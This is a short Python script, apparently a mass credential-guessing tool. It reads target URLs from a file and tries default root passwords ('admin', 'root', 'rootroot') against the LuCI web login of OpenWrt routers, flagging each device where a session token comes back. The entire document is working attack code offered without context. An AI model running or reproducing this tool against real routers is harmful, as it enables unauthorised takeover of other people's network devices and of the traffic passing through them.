#!/usr/bin/python
#-*-coding:utf8-*-
import requests
import re

s=requests.Session()
words=open('target_luci.txt','r').readlines()
for word in words:
    url=word.replace("\r","").replace("\n","")
    print(url)
    passwords=['admin','root','rootroot']
    for password in passwords:
        data={
		'luci_username':'root',
		'luci_password':password
    	      }	
        try:
            r=s.post(url,data=data,timeout=10)
            stok=re.findall('stok=.*/admin/status',r.text)
            if stok:
                print('HTTP Authorized at '+url+' with admin/'+password)
        except requests.exceptions.ConnectTimeout:
            print('ConnectTimeout')
        except requests.exceptions.ReadTimeout:
            print('ReadTimeout')
        except requests.exceptions.ConnectionError:
            print('ConnectionError')
